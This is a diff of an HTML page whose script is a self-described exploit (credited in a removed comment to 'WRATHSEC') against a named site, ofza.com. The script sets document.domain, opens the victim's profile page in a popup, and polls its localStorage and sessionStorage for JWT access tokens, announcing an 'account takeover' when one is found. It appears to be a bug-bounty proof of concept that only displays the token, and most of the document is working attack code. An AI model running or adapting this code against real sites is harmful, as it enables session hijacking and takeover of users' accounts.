@@ -51,24 +51,12 @@
       color: #79c0ff;
       font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
     }
-    a {
-      color: #58a6ff;
-      text-decoration: none;
-    }
+    a { color: #58a6ff; text-decoration: none; }
     a:hover { text-decoration: underline; }
-    .signature {
-      margin-top: 20px;
-      font-weight: 600;
-      color: #3fb950;
-    }
-    .status-pulse {
-      color: #f85149;
-      font-weight: bold;
-      animation: blink 2s infinite;
-    }
+    .signature { margin-top: 20px; font-weight: 600; color: #3fb950; }
+    .status-pulse { color: #f85149; font-weight: bold; animation: blink 2s infinite; }
     @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     
-    /* Exploit Trigger Button */
     .exploit-btn {
       display: block;
       width: 100%;
@@ -106,46 +94,53 @@
   </main>
 
   <script>
-    /**
-     * EXPLOIT ENGINE v2 (Popup Bypass) - WRATHSEC
-     * Bypasses X-Frame-Options: SAMEORIGIN
-     */
-
-    // 1. Sync domain to parent to allow cross-window access
+    // 1. Force domain synchronization
     document.domain = "ofza.com";
 
     function runExploit() {
-        // 2. Open the main site in a popup (Not blocked by X-Frame-Options)
-        // We open it in a small window that will be accessed by this script
-        const targetWin = window.open("https://ofza.com/en", "exploit_win", "width=400,height=400");
+        // 2. Open the page where the API call is triggered
+        const targetUrl = "https://ofza.com/en/profile/overview";
+        const targetWin = window.open(targetUrl, "exploit_win", "width=800,height=600");
 
-        // 3. Wait for the popup to load and settle
-        setTimeout(() => {
+        // 3. Set up a polling interval to catch the JWT the moment it appears
+        let attempts = 0;
+        const maxAttempts = 15; // 15 seconds max
+
+        const checkStorage = setInterval(() => {
+            attempts++;
             try {
-                // 4. Access the popup's storage directly
-                // This is allowed because both windows have document.domain = "ofza.com"
+                // Ensure the bridge is open
+                targetWin.focus();
+                
+                // 4. Search LocalStorage and SessionStorage for the JWT
                 const storage = targetWin.localStorage;
+                const session = targetWin.sessionStorage;
+                
+                // Common keys based on your network logs
                 const jwt = storage.getItem('token') || 
                             storage.getItem('access_token') || 
-                            targetWin.sessionStorage.getItem('Authorization');
+                            storage.getItem('x-access-token') ||
+                            session.getItem('Authorization');
 
                 if (jwt) {
+                    clearInterval(checkStorage);
                     alert(
                         "⚠️ CRITICAL: ACCOUNT TAKEOVER PROVED\n" +
                         "------------------------------------------\n" +
-                        "Researcher: wrathsec\n\n" +
-                        "Full JWT Extracted from ofza.com:\n" + jwt + "\n\n" +
-                        "The presence of this token confirms full impersonation capability."
+                        "Full JWT Extracted from Profile Context:\n\n" + jwt + "\n\n" +
+                        "Account Access level: AUTHORIZED"
                     );
-                    targetWin.close(); // Clean up
-                } else {
-                    alert("SOP Bypass Successful, but no active session found. Please log in to ofza.com and try again.");
+                    targetWin.close();
                 }
             } catch (e) {
-                alert("Exploit Error: Access Denied. Ensure you are logged in to ofza.com and that the site sets document.domain correctly.");
-                console.error(e);
+                console.log("Waiting for window to initialize document.domain...");
             }
-        }, 4000); // 4 seconds to ensure full load
+
+            if (attempts >= maxAttempts) {
+                clearInterval(checkStorage);
+                alert("Exploit Timeout: Token not found. Ensure you are logged in to ofza.com in another tab.");
+            }
+        }, 1000);
     }
   </script>
 </body>
